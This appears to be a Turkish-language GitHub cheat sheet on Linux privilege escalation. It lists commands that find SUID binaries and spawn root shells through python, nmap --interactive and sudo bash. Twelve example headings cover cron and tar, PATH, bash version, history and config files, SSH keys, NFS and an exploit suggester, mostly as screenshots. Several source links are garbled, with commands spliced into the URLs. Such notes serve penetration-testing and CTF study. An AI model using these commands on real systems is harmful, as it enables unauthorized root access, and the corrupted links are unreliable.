## Privilege Escalation


### Yetki Yükseltme

sudo -l

![resim](https://user-images.githubusercontent.com/18248422/180613950-c1b54a74-9e83-4904-b0ec-6cb9aece6b6a.png)


yetki yükseltilebilecek dosyaları arama komutları

find / -perm -u=s -type f 2>/dev/null

find / -user root -perm /4000

find / -user root -perm -4000 -exec ls -ldb {} \;

bir yetki yükseltme python komutu örneği;

usr/bin/python -c 'import os; os.execl("/bin/sh","sh","-p")'

python3 -c 'import pty; pty.spawn("/bin/bash")'

kaynak: https://gtfobins.github.io/gtfobifind usr/bin/python -c 'import os; os.execl("/bin/sh","sh","-p")'/ -user root -perm /4000ns/python/

bir başka yetki yükseltme komutu:

sudo bash

Privilege Escalation with Path Variable Manipulation                            

find / -perm -u=s -type f 2>/dev/null

Find all the SUID/SGID executables on the Debian VM:

find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null


https://www.siberportal.org/red-tefind / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/nullam/linux-penetration-tests/linux-sizma-testlerinde-hak-yukseltme-yontemleri/


### Yetki Yükseltme Örnek-1 :

![resim](https://user-images.githubusercontent.com/18248422/180613982-d2cd4029-a317-440d-83aa-ff6c2ecfe439.png)


python -c 'import pty; pty.spawn("/bin/sh")'

![resim](https://user-images.githubusercontent.com/18248422/180613991-3fe79f41-a97f-4e15-ab21-d0ed193f9f5c.png)


find / -perm -u=s -type f 2>/dev/null

![resim](https://user-images.githubusercontent.com/18248422/180613993-31d247d8-3a16-4b75-aab5-a2c7aa9dbe74.png)


nmap --interactive

nmap> !sh

![resim](https://user-images.githubusercontent.com/18248422/180614001-7d9c7fa1-9e8b-470a-a6f3-81f1bcce08d0.png)


### Yetki Yükseltme Örnek-2 :

![resim](https://user-images.githubusercontent.com/18248422/180614007-067ae96e-4b8b-48b7-b942-449fea1a5223.png)



### Yetki Yükseltme Örnek-3 :

cron ve tar ile;

kaynak: https://tryhackme.com/ronmap --interactiveom/linuxprivesc

![resim](https://user-images.githubusercontent.com/18248422/180614022-ad33d2fd-2850-478a-875f-1512147b6ddc.png)



### Yetki Yükseltme Örnek-4 :

![resim](https://user-images.githubusercontent.com/18248422/180614027-69f55613-ddf1-4b38-9c93-622b894dc545.png)



### Yetki Yükseltme Örnek-5 :

PATH ile;

![resim](https://user-images.githubusercontent.com/18248422/180614032-5d97d6d8-d51b-4418-8054-a1cf2d75cccb.png)



### Yetki Yükseltme Örnek-6 :

bash version <4.2-048 ise;

![resim](https://user-images.githubusercontent.com/18248422/180614037-c1116675-2be1-4495-ab40-e37f8beaa889.png)



### Yetki Yükseltme Örnek-7 :

![resim](https://user-images.githubusercontent.com/18248422/180614059-618f164e-4c2f-420b-b8a1-fe0dc9ef20e8.png)




### Yetki Yükseltme Örnek-8 :

"hidden history files" ile ;

![resim](https://user-images.githubusercontent.com/18248422/180614061-d6122402-87d3-4eef-8a60-84f8537d70a7.png)



### Yetki Yükseltme Örnek-9 :

"config files" ile ;

![resim](https://user-images.githubusercontent.com/18248422/180614066-c536e501-0a18-4e2e-a2b0-a49ea598b9e3.png)




### Yetki Yükseltme Örnek-10 :

"root_keys - SSH Keys, backups ile;

![resim](https://user-images.githubusercontent.com/18248422/180614070-00b4e799-e60f-4374-8001-757d22b0a0e7.png)



### Yetki Yükseltme Örnek-11 :

"NFS servisi ile remote user;

![resim](https://user-images.githubusercontent.com/18248422/180614075-ecd01773-4194-4d15-b19b-b4a49a35b235.png)




### Yetki Yükseltme Örnek-12 :

"Linux Exploit Suggester 2 ile;

![resim](https://user-images.githubusercontent.com/18248422/180614079-9a265967-67a8-44d1-8c94-745ffe9e7c1e.png)

## created by [@ahmetkara](https://github.com/ahmetQara)

